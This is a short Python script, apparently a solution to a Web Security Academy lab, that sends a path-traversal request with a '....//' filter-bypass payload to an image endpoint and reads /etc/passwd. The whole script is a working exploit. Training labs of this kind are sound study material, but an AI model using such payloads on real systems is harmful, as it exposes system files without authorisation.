import requests

site = "0a1b00070373303f80612184003500a2.web-security-academy.net"
url = f"https://{site}/image?filename=....//....//....//etc/passwd"
s = requests.Session()
resp = s.get(url)
print(resp.text)